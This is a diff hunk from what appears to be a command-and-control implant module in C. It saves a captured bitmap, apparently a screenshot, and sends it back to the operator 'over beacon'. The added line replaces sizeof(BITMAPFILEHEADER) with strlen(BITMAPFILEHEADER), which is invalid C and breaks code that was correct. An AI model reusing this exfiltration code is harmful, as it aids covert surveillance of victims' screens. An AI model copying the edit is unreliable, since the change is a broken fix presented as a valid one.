@@ -238,7 +238,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
     }
     else{
         BeaconPrintf(0x0, "[*] Downloading bitmap over beacon with filename %s", lpszFileName);
-        downloadFile((char*)lpszFileName, sizeof(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
+        downloadFile((char*)lpszFileName, sizeof(lpszFileName), (char*)bmpdata, (int)(strlen(BITMAPFILEHEADER) + dwDIBSize));
     }
     
     
